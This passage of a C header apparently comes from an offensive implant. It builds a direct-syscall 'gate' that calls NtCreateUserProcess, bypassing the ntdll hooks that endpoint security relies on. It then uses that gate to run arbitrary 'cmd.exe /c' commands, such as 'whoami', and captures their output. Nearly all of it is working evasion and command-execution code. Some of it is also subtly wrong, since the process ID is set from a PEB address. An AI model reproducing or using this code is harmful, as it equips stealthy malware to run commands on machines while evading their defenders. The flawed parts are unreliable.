    if (ssn == 0xFFFF || !g_syscall_addr) {
        fn = (pfn_NtCreateUserProcess)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateUserProcess");
        if (fn) return fn(ProcessHandle, ThreadHandle,
                          ProcessDesiredAccess, ThreadDesiredAccess,
                          ProcessObjectAttributes, ThreadObjectAttributes,
                          ProcessFlags, ThreadFlags,
                          ProcessParameters, CreateInfo, AttributeList);
        return (NTSTATUS)0xC0000001L;
    }
    fn = (pfn_NtCreateUserProcess)g_syscall_addr;
    GATE_SET_SSN(ssn);
    return fn(ProcessHandle, ThreadHandle,
              ProcessDesiredAccess, ThreadDesiredAccess,
              ProcessObjectAttributes, ThreadObjectAttributes,
              ProcessFlags, ThreadFlags,
              ProcessParameters, CreateInfo, AttributeList);
}

/* ── RtlCreateProcessParametersEx helper ────────────────────────────
 *
 * RtlCreateProcessParametersEx is an Rtl* function (not a syscall),
 * so we call it via GetProcAddress from the in-memory ntdll.  It
 * builds the RTL_USER_PROCESS_PARAMETERS block required by
 * NtCreateUserProcess and handles all ImagePath / CommandLine path
 * normalisation internally.
 * ─────────────────────────────────────────────────────────────────── */

/* RTL_USER_PROC_PARAMS_NORMALIZED -- not in MinGW SDK, define it ourselves.
 * Value 1 tells Rtl* to convert relative offsets to absolute pointers. */
#ifndef RTL_USER_PROC_PARAMS_NORMALIZED
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001UL
#endif

typedef NTSTATUS (WINAPI *pfn_RtlCreateProcessParametersEx)(
    PVOID       *pProcessParameters,
    GATE_UNICODE_STRING *ImagePathName,
    GATE_UNICODE_STRING *DllPath,
    GATE_UNICODE_STRING *CurrentDirectory,
    GATE_UNICODE_STRING *CommandLine,
    PVOID        Environment,
    GATE_UNICODE_STRING *WindowTitle,
    GATE_UNICODE_STRING *DesktopInfo,
    GATE_UNICODE_STRING *ShellInfo,
    GATE_UNICODE_STRING *RuntimeData,
    ULONG        Flags);

typedef NTSTATUS (WINAPI *pfn_RtlDestroyProcessParameters)(PVOID pProcessParameters);

/* Convert ASCII to GATE_UNICODE_STRING (caller frees buf) */
static GATE_UNICODE_STRING gate_str_from_ascii(const char *src) {
    GATE_UNICODE_STRING us;
    size_t len = strlen(src);
    PWSTR buf = (PWSTR)HeapAlloc(GetProcessHeap(), 0, (len + 1) * sizeof(WCHAR));
    if (!buf) { memset(&us, 0, sizeof(us)); return us; }
    for (size_t i = 0; i <= len; i++) buf[i] = (WCHAR)(unsigned char)src[i];
    us.Buffer        = buf;
    us.Length        = (USHORT)(len * sizeof(WCHAR));
    us.MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
    return us;
}

static void gate_free_ustr(GATE_UNICODE_STRING *us) {
    if (us && us->Buffer) {
        HeapFree(GetProcessHeap(), 0, us->Buffer);
        us->Buffer = NULL;
    }
}

/*
 * NT_exec_cmdline — create a child process via NtCreateUserProcess
 *
 *   cmdline  : narrow-character command line ("cmd.exe /c whoami")
 *   hStdOut  : write end of a pipe for child stdout/stderr capture
 *   hStdErr  : same handle (or separate)
 *   pi       : receives process/thread handles
 *
 * Returns NTSTATUS; NT_SUCCESS(status) on success.
 *
 * NOTE: We launch "cmd.exe" unconditionally, passing cmdline as-is.
 *       The image path is resolved to %SystemRoot%\System32\cmd.exe.
 */
static NTSTATUS NT_exec_cmdline(
    const char       *cmdline,
    HANDLE            hStdOut,
    HANDLE            hStdErr,
    PROCESS_INFORMATION *pi)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return (NTSTATUS)0xC0000001L;

    pfn_RtlCreateProcessParametersEx fnCreate =
        (pfn_RtlCreateProcessParametersEx)
        GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    pfn_RtlDestroyProcessParameters fnDestroy =
        (pfn_RtlDestroyProcessParameters)
        GetProcAddress(ntdll, "RtlDestroyProcessParameters");
    if (!fnCreate) return (NTSTATUS)0xC0000001L;

    /* Build full cmd.exe path */
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, sizeof(sysdir));
    char imgpath[MAX_PATH];
    snprintf(imgpath, sizeof(imgpath), "\\??\\%s\\cmd.exe", sysdir);

    /* Build command line: "cmd.exe /c <cmdline>" */
    char cmdline_full[4096 + 64];
    snprintf(cmdline_full, sizeof(cmdline_full), "cmd.exe /c %s", cmdline);

    GATE_UNICODE_STRING usImagePath = gate_str_from_ascii(imgpath);
    GATE_UNICODE_STRING usCmdLine   = gate_str_from_ascii(cmdline_full);
    if (!usImagePath.Buffer || !usCmdLine.Buffer) {
        gate_free_ustr(&usImagePath);
        gate_free_ustr(&usCmdLine);
        return (NTSTATUS)0xC0000017L; /* STATUS_NO_MEMORY */
    }

    /* Desktop/window title strings */
    GATE_UNICODE_STRING usDesktop = gate_str_from_ascii("Winsta0\\Default");
    GATE_UNICODE_STRING usTitle   = gate_str_from_ascii("");

    /* Create process parameters */
    PVOID procParams = NULL;
    NTSTATUS st = fnCreate(
        &procParams,
        &usImagePath,
        NULL,
        NULL,
        &usCmdLine,
        NULL,
        &usTitle,
        &usDesktop,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED);
    gate_free_ustr(&usImagePath);
    gate_free_ustr(&usCmdLine);
    gate_free_ustr(&usDesktop);
    gate_free_ustr(&usTitle);
    if (!NT_SUCCESS(st)) return st;

    /* Inherit stdout/stderr redirects via std handle attribute */
    typedef struct {
        ULONG Flags;
        HANDLE StdInput;
        HANDLE StdOutput;
        HANDLE StdError;
    } GATE_STD_HANDLE_INFO;

    GATE_STD_HANDLE_INFO stdHandles;
    memset(&stdHandles, 0, sizeof(stdHandles));
    stdHandles.Flags     = 0x00000007; /* HANDLE_FLAG_INHERIT all three */
    stdHandles.StdInput  = GetStdHandle(STD_INPUT_HANDLE);
    stdHandles.StdOutput = hStdOut;
    stdHandles.StdError  = hStdErr;

    /* Attribute list: [0] ImageName (required), [1] StdHandleInfo */
    GATE_PS_ATTRIBUTE_LIST attrList;
    memset(&attrList, 0, sizeof(attrList));
    attrList.TotalLength = sizeof(GATE_PS_ATTRIBUTE_LIST);

    attrList.Attributes[0].Attribute  = GATE_PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size       = usImagePath.Length;
    attrList.Attributes[0].ValuePtr   = procParams; /* RTL params embed the image name */

    /* Use the image path re-extracted from procParams */
    GATE_RTL_USER_PROCESS_PARAMETERS *pp =
        (GATE_RTL_USER_PROCESS_PARAMETERS*)procParams;
    attrList.Attributes[0].Size       = pp->ImagePathName.Length;
    attrList.Attributes[0].ValuePtr   = pp->ImagePathName.Buffer;

    attrList.Attributes[1].Attribute  = GATE_PS_ATTRIBUTE_STD_HANDLE;
    attrList.Attributes[1].Size       = sizeof(stdHandles);
    attrList.Attributes[1].ValuePtr   = &stdHandles;

    /* PS_CREATE_INFO */
    GATE_PS_CREATE_INFO createInfo;
    memset(&createInfo, 0, sizeof(createInfo));
    createInfo.Size  = sizeof(createInfo);
    createInfo.State = PsCreateInitialState;
    createInfo.InitState.InitFlags = 0;
    createInfo.InitState.AdditionalFileAccess = 0;

    /* Create the process */
    HANDLE hProcess = NULL, hThread = NULL;
    st = Gate_NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        0,    /* ProcessFlags   — 0 = normal */
        0,    /* ThreadFlags    — 0 = start suspended is 1; 0 = run immediately */
        procParams,
        &createInfo,
        &attrList);

    if (fnDestroy) fnDestroy(procParams);

    if (NT_SUCCESS(st)) {
        pi->hProcess = hProcess;
        pi->hThread  = hThread;
        pi->dwProcessId = (DWORD)(ULONG_PTR)createInfo.SuccessState.PebAddressNative;
        pi->dwThreadId  = 0;
    }
    return st;
}

#pragma GCC diagnostic pop

#endif /* APEX_SYSCALL_H */
